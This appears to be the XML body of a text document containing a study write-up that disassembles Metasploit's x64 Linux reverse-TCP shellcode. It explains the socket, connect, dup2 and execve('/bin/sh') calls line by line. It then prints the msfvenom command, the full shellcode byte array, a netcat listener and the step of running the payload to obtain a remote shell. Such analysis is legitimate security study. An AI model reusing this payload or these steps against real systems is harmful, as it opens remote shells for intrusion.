      <text:p text:style-name="P64"/>
      <text:p text:style-name="P7">Code analysis step by step:</text:p>
      <text:p text:style-name="P7"><draw:rect text:anchor-type="paragraph" draw:z-index="21" draw:style-name="gr1" draw:text-style-name="P76" svg:width="1.7449in" svg:height="1.9425in" svg:x="-0.1126in" svg:y="0.1307in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P65"><text:span text:style-name="T2"><text:s/></text:span><text:span text:style-name="T24">&lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>0x29</text:span></text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+2&gt;:<text:tab/>pop <text:s text:c="3"/>rax</text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+3&gt;:<text:tab/><text:span text:style-name="T87">cdq</text:span> <text:s text:c="14"/></text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+<text:span text:style-name="T87">4</text:span>&gt;:<text:tab/>push <text:s text:c="2"/>0x2</text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+<text:span text:style-name="T87">6</text:span>&gt;:<text:tab/>pop <text:s text:c="3"/>rdi</text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+<text:span text:style-name="T87">7</text:span>&gt;:<text:tab/>push <text:s text:c="2"/>0x1</text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+<text:span text:style-name="T87">9</text:span>&gt;:pop <text:s text:c="3"/>rsi</text:p>
      <text:p text:style-name="P69"><text:span text:style-name="T2"><text:s/>&lt;+1</text:span><text:span text:style-name="T87">0</text:span><text:span text:style-name="T2">&gt;:syscall </text:span></text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P31"><draw:rect text:anchor-type="paragraph" draw:z-index="2" draw:style-name="gr1" draw:text-style-name="P76" svg:width="1.3496in" svg:height="0.4488in" svg:x="0.3055in" svg:y="0.1016in"><text:p/></draw:rect><text:tab/></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T70"><text:s text:c="9"/>&lt;+0&gt;</text:span><text:span text:style-name="T69">push <text:s/>0x29 <text:s text:c="7"/></text:span></text:p>
      <text:p text:style-name="P30"><text:span text:style-name="T69"><text:s text:c="9"/></text:span><text:span text:style-name="T70">&lt;+2&gt;</text:span><text:span text:style-name="T69"> pop <text:s text:c="3"/>rax <text:s/></text:span><text:span text:style-name="T72"><text:s/></text:span><text:span text:style-name="T2"><text:s text:c="11"/></text:span><text:span text:style-name="T35"><text:s/></text:span><text:span text:style-name="T43">mov</text:span><text:span text:style-name="T44">e</text:span><text:span text:style-name="T43"> value</text:span><text:span text:style-name="T39"> 0x29 (41) </text:span><text:span text:style-name="T42">to </text:span><text:span text:style-name="T10">rax</text:span><text:span text:style-name="T42"> </text:span><text:span text:style-name="T41">thought</text:span><text:span text:style-name="T39"> the stack </text:span></text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16"><draw:rect text:anchor-type="paragraph" draw:z-index="3" draw:style-name="gr1" draw:text-style-name="P76" svg:width="1.3378in" svg:height="0.7913in" svg:x="0.3055in" svg:y="0.1016in"><text:p/></draw:rect> <text:s text:c="5"/><text:tab/></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T39"><text:tab/></text:span><text:span text:style-name="T70">&lt;+3&gt;</text:span><text:span text:style-name="T71">cdq</text:span><text:span text:style-name="T69"> <text:s text:c="21"/></text:span><text:span text:style-name="T39"><text:s text:c="2"/>set </text:span><text:span text:style-name="T69">rdx </text:span><text:span text:style-name="T39">to zero</text:span></text:p>
      <text:p text:style-name="P43"><text:span text:style-name="T60"><text:s text:c="12"/></text:span><text:span text:style-name="T73">&lt;+</text:span><text:span text:style-name="T74">4</text:span><text:span text:style-name="T73">&gt;</text:span><text:span text:style-name="T72">push <text:s/>0x2 <text:s text:c="5"/></text:span></text:p>
      <text:p text:style-name="P30"><text:span text:style-name="T45"><text:tab/></text:span><text:span text:style-name="T70">&lt;+</text:span><text:span text:style-name="T71">6</text:span><text:span text:style-name="T70">&gt;</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T69">pop <text:s text:c="3"/>rdi <text:s text:c="3"/></text:span><text:span text:style-name="T72"><text:s text:c="10"/></text:span><text:span text:style-name="T39"><text:s text:c="2"/>mov</text:span><text:span text:style-name="T40">e</text:span><text:span text:style-name="T39"> value 0x2 to </text:span><text:span text:style-name="T69">rdi </text:span><text:span text:style-name="T41">thought</text:span><text:span text:style-name="T39"> the stack</text:span></text:p>
      <text:p text:style-name="P23"><text:tab/></text:p>
      <text:p text:style-name="P23"><draw:rect text:anchor-type="paragraph" draw:z-index="4" draw:style-name="gr1" draw:text-style-name="P76" svg:width="1.4894in" svg:height="0.7913in" svg:x="0.3055in" svg:y="0.1016in"><text:p/></draw:rect><text:tab/></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T45"><text:s text:c="11"/></text:span><text:span text:style-name="T70">&lt;+7</text:span><text:span text:style-name="T69">&gt;</text:span><text:span text:style-name="T71">p</text:span><text:span text:style-name="T69">ush <text:s/>0x1 </text:span></text:p>
      <text:p text:style-name="P36"><text:span text:style-name="T2"><text:s text:c="11"/></text:span><text:span text:style-name="T4">&lt;+</text:span><text:span text:style-name="T6">9</text:span><text:span text:style-name="T4">&gt;</text:span><text:span text:style-name="T2"> pop <text:s text:c="3"/>rsi <text:tab/> <text:s text:c="2"/></text:span><text:span text:style-name="T54">mov</text:span><text:span text:style-name="T55">e</text:span><text:span text:style-name="T54"> value 0x1 to </text:span><text:span text:style-name="T72">rsi</text:span><text:span text:style-name="T75"> </text:span><text:span text:style-name="T56">thought</text:span><text:span text:style-name="T54"> the stack</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T64"><text:s text:c="11"/></text:span><text:span text:style-name="T66">&lt;+1</text:span><text:span text:style-name="T67">0</text:span><text:span text:style-name="T66">&gt; </text:span><text:span text:style-name="T64">syscall </text:span><text:span text:style-name="T2"><text:tab/><text:tab/> <text:s text:c="2"/></text:span><text:span text:style-name="T39">syscall 41 = socket syscall</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P8">prototype of function socket get by command : “man 2 socket” </text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><draw:rect text:anchor-type="paragraph" draw:z-index="5" draw:style-name="gr1" draw:text-style-name="P76" svg:width="3.3843in" svg:height="0.3004in" svg:x="0.3055in" svg:y="0.1016in"><text:p/></draw:rect><text:tab/></text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T36"><text:tab/></text:span><text:span text:style-name="T61"> int socket(int domain, int type, int protocol);</text:span></text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41"><text:tab/>domain → rdi</text:p>
      <text:p text:style-name="P41"><text:tab/>type → rsi</text:p>
      <text:p text:style-name="P41"><text:tab/>protocol → rdx</text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P6"><text:soft-page-break/></text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16"><text:span text:style-name="T2">definition get by the command </text:span>“<text:span text:style-name="T2">man 2 socket”</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"><draw:rect text:anchor-type="paragraph" draw:z-index="7" draw:style-name="gr1" draw:text-style-name="P76" svg:width="5.3953in" svg:height="0.2331in" svg:x="-0.0311in" svg:y="0.1681in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P41">socket() creates an endpoint for communication and returns a descriptor. </text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P18"><text:span text:style-name="T18">rax</text:span> get the return value (sockfd)</text:p>
      <text:p text:style-name="P16">The value of <text:span text:style-name="T18">rdi</text:span> is 2 , 2 correspond to <text:span text:style-name="T2">AF_INET</text:span></text:p>
      <text:p text:style-name="P16">The value of <text:span text:style-name="T18">rsi </text:span>is 1 , 1 correspond to <text:span text:style-name="T2">SOCK_STREAM</text:span></text:p>
      <text:p text:style-name="P16">The value of <text:span text:style-name="T18">rdx </text:span>is 0 , 0 correspond to<text:span text:style-name="T2"> TCP </text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P8">(You can get this value using python and socket module)</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P16">Finally the function call look-like this :</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16"><draw:rect text:anchor-type="paragraph" draw:z-index="6" draw:style-name="gr1" draw:text-style-name="P76" svg:width="3.198in" svg:height="0.3004in" svg:x="0.1429in" svg:y="0.1016in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P16"><text:tab/><text:span text:style-name="T18">rax ←</text:span> <text:span text:style-name="T20">socket(rdi = 2 , rsi = 1 , rdx = 0);</text:span></text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P10">Next couple of instructions :</text:p>
      <text:p text:style-name="P10"><draw:rect text:anchor-type="paragraph" draw:z-index="8" draw:style-name="gr1" draw:text-style-name="P76" svg:width="3.3835in" svg:height="1.9551in" svg:x="-0.0193in" svg:y="0.0972in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P65"><text:span text:style-name="T2"><text:s/></text:span><text:span text:style-name="T24">&lt;+1</text:span><text:span text:style-name="T25">2</text:span><text:span text:style-name="T24">&gt;:<text:tab/>xchg <text:s text:c="2"/>rdi,rax</text:span></text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+1<text:span text:style-name="T87">4</text:span>&gt;:<text:tab/>movabs rcx,0x100007fb3150002</text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+2<text:span text:style-name="T87">4</text:span>&gt;:<text:tab/>push <text:s text:c="2"/>rcx</text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+2<text:span text:style-name="T87">5</text:span>&gt;:<text:tab/>mov <text:s text:c="3"/>rsi,rsp</text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+<text:span text:style-name="T87">28</text:span>&gt;:<text:tab/>push <text:s text:c="2"/>0x10</text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+<text:span text:style-name="T87">30</text:span>&gt;:<text:tab/>pop <text:s text:c="3"/>rdx</text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+3<text:span text:style-name="T87">1</text:span>&gt;:<text:tab/>push <text:s text:c="2"/>0x2a</text:p>
      <text:p text:style-name="P69"><text:s/>&lt;+3<text:span text:style-name="T87">3</text:span>&gt;:<text:tab/>pop <text:s text:c="3"/>rax</text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T21"><text:s/>&lt;+3</text:span><text:span text:style-name="T27">4</text:span><text:span text:style-name="T21">&gt;:<text:tab/>syscall </text:span></text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P11">Prototype of the connect function:</text:p>
      <text:p text:style-name="P11"><draw:rect text:anchor-type="paragraph" draw:z-index="10" draw:style-name="gr1" draw:text-style-name="P76" svg:width="4.7567in" svg:height="0.5177in" svg:x="-0.2173in" svg:y="0.1429in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P51">int connect(int sockfd, const struct sockaddr *addr, </text:p>
      <text:p text:style-name="P51"><text:s text:c="19"/>socklen_t addrlen); </text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P19"><text:span text:style-name="T76"><text:tab/></text:span><text:span text:style-name="T9">rdi → sockfd</text:span></text:p>
      <text:p text:style-name="P51"><text:tab/>rsi → *addr</text:p>
      <text:p text:style-name="P51"><text:tab/>rdx → addrlen</text:p>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32"><draw:rect text:anchor-type="paragraph" draw:z-index="9" draw:style-name="gr1" draw:text-style-name="P76" svg:width="3.0697in" svg:height="0.8976in" svg:x="0.3063in" svg:y="0.0929in"><text:p/></draw:rect><text:tab/></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T76"><text:tab/></text:span><text:span text:style-name="T66">&lt;+1</text:span><text:span text:style-name="T67">2</text:span><text:span text:style-name="T66">&gt; </text:span><text:span text:style-name="T64">xchg <text:s text:c="2"/>r</text:span><text:span text:style-name="T65">di </text:span><text:span text:style-name="T64">, r</text:span><text:span text:style-name="T65">a</text:span><text:span text:style-name="T68">x </text:span><text:span text:style-name="T77"><text:s text:c="6"/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T37">xchg value of rax , rdi -&gt; mov</text:span><text:span text:style-name="T38">e</text:span><text:span text:style-name="T37"> sockfd to rdi</text:span></text:p>
      <text:p text:style-name="P34"><text:s text:c="14"/><text:tab/></text:p>
      <text:p text:style-name="P27"><text:span text:style-name="T64"><text:s text:c="11"/></text:span><text:span text:style-name="T66">&lt;+2</text:span><text:span text:style-name="T67">4</text:span><text:span text:style-name="T66">&gt; </text:span><text:span text:style-name="T64">movabs </text:span><text:span text:style-name="T65">rcx , </text:span><text:span text:style-name="T64">0x100007fb3150002 <text:s/></text:span><text:span text:style-name="T2"><text:s text:c="3"/></text:span><text:span text:style-name="T46">// *</text:span><text:span text:style-name="T47">addr filling </text:span></text:p>
      <text:p text:style-name="P28"><text:span text:style-name="T2"><text:s text:c="13"/></text:span><text:span text:style-name="T66">&lt;+2</text:span><text:span text:style-name="T67">5</text:span><text:span text:style-name="T66">&gt;</text:span><text:span text:style-name="T4"> <text:s/></text:span><text:span text:style-name="T64">mov <text:s text:c="3"/>rs</text:span><text:span text:style-name="T65">i</text:span><text:span text:style-name="T64">,rs</text:span><text:span text:style-name="T65">p</text:span><text:span text:style-name="T64"> </text:span></text:p>
      <text:p text:style-name="P35"><text:tab/></text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P28"><text:span text:style-name="T2"><text:tab/></text:span><text:span text:style-name="T51">Remember</text:span><text:span text:style-name="T52"> <text:s/>how is fill <text:s/>struct sockaddr *addr:</text:span></text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P25"><draw:rect text:anchor-type="paragraph" draw:z-index="22" draw:style-name="gr1" draw:text-style-name="P76" svg:width="4.4303in" svg:height="0.8661in" svg:x="0.3063in" svg:y="0.0937in"><text:p/></draw:rect><text:soft-page-break/></text:p>
      <text:p text:style-name="P47"><text:tab/><text:span text:style-name="T78"> ; server.sin_family = AF_INET </text:span></text:p>
      <text:p text:style-name="P54"><text:tab/>; server.sin_port = htons(PORT)</text:p>
      <text:p text:style-name="P54"><text:tab/>; server.sin_addr.s_addr = inet_addr("127.0.0.1")</text:p>
      <text:p text:style-name="P54"><text:tab/>; bzero(&amp;server.sin_zero, 8)</text:p>
      <text:p text:style-name="P48"/>
      <text:p text:style-name="P49"><text:tab/>;in this case inet_addr in hex is 1000007fb (reverse order) correspond at the 4 upperbytes of value moved to rcx</text:p>
      <text:p text:style-name="P49"><text:tab/><text:tab/><text:tab/><text:span text:style-name="T22">0x</text:span><text:span text:style-name="T79">100007f</text:span><text:span text:style-name="T23">b</text:span><text:span text:style-name="T22">3150002 </text:span></text:p>
      <text:p text:style-name="P49">;<text:span text:style-name="T78">server.sin_port </text:span>= <text:span text:style-name="T87">b</text:span>315 in network byte order , with socket.ntohs(<text:span text:style-name="T83">b</text:span>315) in python the value in little endian is 15105 correspond to <text:span text:style-name="T22">0x100007f</text:span><text:span text:style-name="T79">b315</text:span><text:span text:style-name="T12">0</text:span><text:span text:style-name="T22">002 </text:span></text:p>
      <text:p text:style-name="P49"><text:tab/></text:p>
      <text:p text:style-name="P49">;<text:span text:style-name="T78"> server.sin_family = AF_INET </text:span>= 2 correspond to <text:span text:style-name="T22">0x100007fb315</text:span><text:span text:style-name="T80">0</text:span><text:span text:style-name="T79">002</text:span><text:span text:style-name="T22"> </text:span></text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P56">; bzero(&amp;server.sin_zero, 8) = 8 null bytes </text:p>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P53"><text:span text:style-name="T1">s</text:span>hellcode connect to localhost in <text:span text:style-name="T83">5555</text:span> port ..</text:p>
      <text:p text:style-name="P53"/>
      <text:p text:style-name="P53"><draw:rect text:anchor-type="paragraph" draw:z-index="11" draw:style-name="gr1" draw:text-style-name="P76" svg:width="1.6862in" svg:height="1.1862in" svg:x="-0.0429in" svg:y="0.0409in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P75"><text:span text:style-name="T15"><text:s text:c="2"/></text:span><text:span text:style-name="T24">&lt;+</text:span><text:span text:style-name="T25">28</text:span><text:span text:style-name="T24">&gt;:push <text:s text:c="2"/>0x10 <text:tab/><text:tab/></text:span><text:span text:style-name="T51">size of <text:s/></text:span><text:span text:style-name="T49">*addr </text:span><text:span text:style-name="T48">to </text:span><text:span text:style-name="T28">rdx</text:span><text:span text:style-name="T49">,</text:span><text:span text:style-name="T50">(16 bytes)</text:span></text:p>
      <text:p text:style-name="P69"><text:s text:c="2"/>&lt;+3<text:span text:style-name="T87">0</text:span>&gt;:pop <text:s text:c="3"/>rdx</text:p>
      <text:p text:style-name="P69"><text:s text:c="3"/>&lt;+3<text:span text:style-name="T87">1</text:span>&gt;:push <text:s text:c="2"/>0x2a</text:p>
      <text:p text:style-name="P69"><text:s text:c="2"/>&lt;+3<text:span text:style-name="T87">3</text:span>&gt;:pop <text:s text:c="3"/>rax</text:p>
      <text:p text:style-name="P72"><text:span text:style-name="T4"><text:s text:c="2"/>&lt;+3</text:span><text:span text:style-name="T6">4</text:span><text:span text:style-name="T4">&gt;:syscall </text:span><text:span text:style-name="T5"> <text:s text:c="9"/><text:tab/><text:tab/></text:span><text:span text:style-name="T31">syscall number 42</text:span></text:p>
      <text:p text:style-name="P44"><text:s text:c="9"/></text:p>
      <text:p text:style-name="P71"><text:span text:style-name="T2"><text:s text:c="22"/></text:span></text:p>
      <text:p text:style-name="P44"><text:s text:c="13"/><text:tab/><text:tab/><text:tab/><text:tab/> <text:s text:c="4"/></text:p>
      <text:p text:style-name="P42"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P12">Next couple of instructions :</text:p>
      <text:p text:style-name="P73"><draw:rect text:anchor-type="paragraph" draw:z-index="12" draw:style-name="gr1" draw:text-style-name="P76" svg:width="2.2795in" svg:height="1.5587in" svg:x="0.1083in" svg:y="0.0965in"><text:p/></draw:rect><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P73"><text:span text:style-name="T16"><text:s text:c="4"/></text:span><text:span text:style-name="T84">&lt;+36&gt;:<text:tab/>push <text:s text:c="2"/>0x3</text:span></text:p>
      <text:p text:style-name="P69"><text:s text:c="4"/>&lt;+<text:span text:style-name="T87">38</text:span>&gt;:<text:tab/>pop <text:s text:c="3"/>rsi</text:p>
      <text:p text:style-name="P69"><text:s text:c="4"/>&lt;+<text:span text:style-name="T87">39</text:span>&gt;:<text:tab/>dec <text:s text:c="3"/>rsi</text:p>
      <text:p text:style-name="P69"><text:s text:c="3"/>&lt;+4<text:span text:style-name="T87">2</text:span>&gt;:<text:tab/>push <text:s text:c="2"/>0x21</text:p>
      <text:p text:style-name="P69"><text:s text:c="4"/>&lt;+4<text:span text:style-name="T87">4</text:span>&gt;:<text:tab/>pop <text:s text:c="3"/>rax</text:p>
      <text:p text:style-name="P73"><draw:rect text:anchor-type="paragraph" draw:z-index="24" draw:style-name="gr1" draw:text-style-name="P76" svg:width="1.7331in" svg:height="0.2795in" svg:x="2.6665in" svg:y="0.1866in"><text:p/></draw:rect><text:span text:style-name="T84"> <text:s text:c="2"/>&lt;+45&gt;:<text:tab/>syscall  <text:tab/><text:tab/></text:span><text:span text:style-name="T32">we see a syscall , dup2 function (syscall number 33)</text:span></text:p>
      <text:p text:style-name="P74"><text:s text:c="4"/><text:span text:style-name="T61"><text:s/>jne <text:s text:c="3"/>0x6009a9 &lt;code+41&gt; <text:s text:c="8"/>--</text:span><text:span text:style-name="T62">&gt; </text:span><text:span text:style-name="T63">jne <text:s text:c="3"/>27 &lt;dup2_loop&gt; <text:s/></text:span><text:span text:style-name="T62"><text:s text:c="5"/></text:span><text:span text:style-name="T53">in metasploit file </text:span></text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P24">Prototype of the dup2 function given by “man 2 dup2”</text:p>
      <text:p text:style-name="P37"><draw:rect text:anchor-type="paragraph" draw:z-index="13" draw:style-name="gr1" draw:text-style-name="P76" svg:width="2.2677in" svg:height="0.3724in" svg:x="0.0035in" svg:y="0.0752in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P40"><text:s/>int dup2(int oldfd, int newfd); </text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P20">Explanation given by the manual </text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">These system calls create a copy of the file descriptor oldfd. </text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P20">dup2 copy stdin , stderr, stdout , duplicate to send to the “attacker machine”.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P39"><draw:rect text:anchor-type="paragraph" draw:z-index="23" draw:style-name="gr1" draw:text-style-name="P76" svg:width="1.7331in" svg:height="0.2795in" svg:x="0.0035in" svg:y="-0.0165in"><text:p/></draw:rect> jne <text:s text:c="3"/>27 &lt;dup2_loop&gt; <text:s text:c="5"/><text:span text:style-name="T32">jne not equal <text:s/>pass control to the next instruction if the zero-flag is </text:span></text:p>
      <text:p text:style-name="P17"><text:soft-page-break/></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T81">set , in this case zero flag is set if </text:span><text:span text:style-name="T19">rsi</text:span><text:span text:style-name="T81"> == 0 , (</text:span><text:span text:style-name="T19">rsi</text:span><text:span text:style-name="T81"> have the new sockfd value)</text:span></text:p>
      <text:p text:style-name="P20">the loop start in this instruction </text:p>
      <text:p text:style-name="P39"><draw:rect text:anchor-type="paragraph" draw:z-index="14" draw:style-name="gr1" draw:text-style-name="P76" svg:width="1.3142in" svg:height="0.2449in" svg:x="0.0035in" svg:y="0.0193in"><text:p/></draw:rect> <text:s text:c="3"/><text:span text:style-name="T87">&lt;+41&gt; dec </text:span>rsi </text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P13">Next couple of instructions:</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P26">This is THE syscall , execve syscall</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:rect text:anchor-type="paragraph" draw:z-index="15" draw:style-name="gr1" draw:text-style-name="P76" svg:width="2.7677in" svg:height="2.1331in" svg:x="-0.1591in" svg:y="0.0555in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P4"><text:s/><text:span text:style-name="T27">&lt;+49&gt;</text:span><text:span text:style-name="T29"> </text:span><text:span text:style-name="T26">push <text:s/>0x3b <text:tab/><text:tab/><text:tab/><text:tab/></text:span></text:p>
      <text:p text:style-name="P46"><text:s/><text:span text:style-name="T87">&lt;+51&gt;</text:span>pop <text:s text:c="3"/>rax <text:tab/><text:tab/> <text:s text:c="16"/><text:span text:style-name="T58">mov</text:span><text:span text:style-name="T59">e</text:span><text:span text:style-name="T58"> value</text:span><text:span text:style-name="T54"> 0x</text:span><text:span text:style-name="T57">3b</text:span><text:span text:style-name="T54"> (</text:span><text:span text:style-name="T57">59</text:span><text:span text:style-name="T54">) </text:span><text:span text:style-name="T57">to </text:span><text:span text:style-name="T13">rax</text:span><text:span text:style-name="T57"> </text:span><text:span text:style-name="T56">thought</text:span><text:span text:style-name="T54"> the stack </text:span></text:p>
      <text:p text:style-name="P45"><text:s/><text:span text:style-name="T87">&lt;+52&gt; cdq</text:span><text:tab/><text:tab/><text:tab/> <text:s text:c="4"/><text:span text:style-name="T87"><text:s text:c="12"/>rdx</text:span><text:span text:style-name="T33"> set to null</text:span></text:p>
      <text:p text:style-name="P46"><text:s/><text:span text:style-name="T87">&lt;+53&gt; </text:span>mov <text:span text:style-name="T81">rbx , </text:span>0x68732f6e69622f <text:s text:c="4"/><text:span text:style-name="T33">move string </text:span><text:span text:style-name="T30">“/bin/sh”</text:span><text:span text:style-name="T33"> in reverse order to </text:span><text:span text:style-name="T82">rbx</text:span><text:span text:style-name="T33"> and push it <text:s text:c="17"/></text:span><text:span text:style-name="T34">|</text:span><text:span text:style-name="T87">&lt;+63&gt;</text:span><text:span text:style-name="T33"><text:tab/></text:span>push <text:s text:c="2"/>rbx <text:span text:style-name="T33"><text:tab/><text:tab/> <text:s text:c="17"/>into the stack </text:span><text:s/></text:p>
      <text:p text:style-name="P45"><text:s/><text:span text:style-name="T87">&lt;+64&gt;</text:span>mov <text:s text:c="3"/>r<text:span text:style-name="T81">di , rsp <text:s text:c="27"/></text:span><text:span text:style-name="T32">move stack pointer to rdi</text:span><text:span text:style-name="T31"> </text:span></text:p>
      <text:p text:style-name="P45"><text:s/><text:span text:style-name="T88">&lt;+67&gt;</text:span> push <text:s text:c="2"/>rdx <text:tab/><text:tab/><text:tab/> <text:s text:c="4"/><text:span text:style-name="T82">rdx </text:span><text:span text:style-name="T33">pushed into the stack</text:span><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P45"><text:s/><text:span text:style-name="T88">&lt;+68&gt;</text:span> push <text:s text:c="2"/>rdi <text:tab/><text:tab/><text:tab/> <text:s text:c="4"/><text:span text:style-name="T33">address of </text:span><text:span text:style-name="T30">“bin/sh”</text:span><text:span text:style-name="T33"> pushed into the stack and moved</text:span><text:span text:style-name="T82"> </text:span><text:span text:style-name="T33">to</text:span><text:span text:style-name="T82"> rdi</text:span><text:tab/></text:p>
      <text:p text:style-name="P45"><text:s/><text:span text:style-name="T88">&lt;+69&gt;</text:span> <text:s/>mov <text:s text:c="3"/>rs<text:span text:style-name="T81">i</text:span>, rs<text:span text:style-name="T81">p</text:span> </text:p>
      <text:p text:style-name="P39"><text:s/><text:span text:style-name="T88">&lt;+72&gt;</text:span> <text:s/>syscall <text:tab/><text:tab/><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P21">Finally the function call look-like this :</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P52">execve (rdi &lt;&lt;“/bin/sh”&gt;&gt; , rsi &lt;&lt;address of ”/bin/sh”&gt;&gt; , rdx = 0);</text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P14">Finally , how to test the shellcode :</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P15"><text:span text:style-name="T14">s</text:span><text:span text:style-name="T8">hellcode given by msfvenom command :</text:span></text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P57"><draw:rect text:anchor-type="paragraph" draw:z-index="16" draw:style-name="gr1" draw:text-style-name="P76" svg:width="3.7449in" svg:height="0.3815in" svg:x="0.2709in" svg:y="0.0555in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T8"><text:tab/>:~# </text:span>msfvenom -p linux/x64/shell_reverse_tcp -f c </text:p>
      <text:p text:style-name="P57"><text:tab/></text:p>
      <text:p text:style-name="P57">unsigned char buf[] = </text:p>
      <text:p text:style-name="P57">"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48" </text:p>
      <text:p text:style-name="P57">"\xb9\x02\x00\x11\x5c\xc0\xa8\x0b\x8e\x51\x48\x89\xe6\x6a\x10" </text:p>
      <text:p text:style-name="P57">"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58" </text:p>
      <text:p text:style-name="P57">"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f" </text:p>
      <text:p text:style-name="P57">"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"; </text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P22">compile with the squelette program to test shellcode :</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">open listener with netcat</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22"><draw:rect text:anchor-type="paragraph" draw:z-index="17" draw:style-name="gr1" draw:text-style-name="P76" svg:width="1.4776in" svg:height="0.4705in" svg:x="0.0618in" svg:y="0.0264in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T8"><text:s text:c="3"/></text:span><text:span text:style-name="T76"># nc -l -p 5555 -v</text:span></text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P59">Execute the shellcode and get the shell trough netcat:</text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P59"><draw:rect text:anchor-type="paragraph" draw:z-index="18" draw:style-name="gr1" draw:text-style-name="P76" svg:width="1.4776in" svg:height="0.4705in" svg:x="0.0618in" svg:y="0.0264in"><text:p/></draw:rect><text:soft-page-break/></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T9"><text:s text:c="2"/></text:span><text:span text:style-name="T76"><text:s/>#./shellcode</text:span></text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P58"><draw:rect text:anchor-type="paragraph" draw:z-index="19" draw:style-name="gr1" draw:text-style-name="P76" svg:width="5.128in" svg:height="2.7512in" svg:x="-0.078in" svg:y="0.0264in"><text:p/></draw:rect></text:p>
